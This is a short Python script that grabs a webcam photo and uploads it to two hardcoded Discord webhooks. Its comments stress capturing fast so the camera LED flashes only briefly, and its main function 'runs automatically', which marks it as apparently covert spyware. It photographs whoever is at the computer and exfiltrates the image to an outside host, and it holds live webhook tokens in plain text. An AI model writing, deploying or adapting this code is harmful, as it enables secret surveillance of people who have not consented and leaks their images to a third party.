import cv2
import requests
import time
from datetime import datetime
import sys

# Discord webhooks
WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]

def quick_capture():
    """Capture as quickly as possible (LED will flash briefly)."""
    try:
        # Open and close camera FAST
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        # Set low resolution for speed (LED turns ON here)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
        
        # Grab quickly
        for _ in range(2):
            cap.grab()
        
        # Capture frame (LED is ON)
        ret, frame = cap.read()
        
        # Release immediately (LED turns OFF)
        cap.release()
        
        return frame if ret else None
    except:
        return None

def send_to_discord(image, webhook_url):
    """Send image to Discord."""
    try:
        _, buffer = cv2.imencode('.jpg', image)
        files = {'file': ('photo.jpg', buffer.tobytes(), 'image/jpeg')}
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = {'content': f"Capture at {timestamp}"}
        
        response = requests.post(webhook_url, files=files, data=data, timeout=10)
        return response.status_code == 204
    except:
        return False

def main():
    """Main function - runs automatically."""
    # Capture image (LED will flash for ~0.2 seconds)
    image = quick_capture()
    
    if image is None:
        print("ERROR: Failed to capture image")
        sys.exit(1)
    
    # Send to Discord webhooks
    success = False
    for webhook in WEBHOOKS:
        if send_to_discord(image, webhook):
            success = True
        time.sleep(0.5)  # Delay between webhooks
    
    if success:
        sys.exit(0)  # Success
    else:
        sys.exit(1)  # Failure

if __name__ == "__main__":
    main()
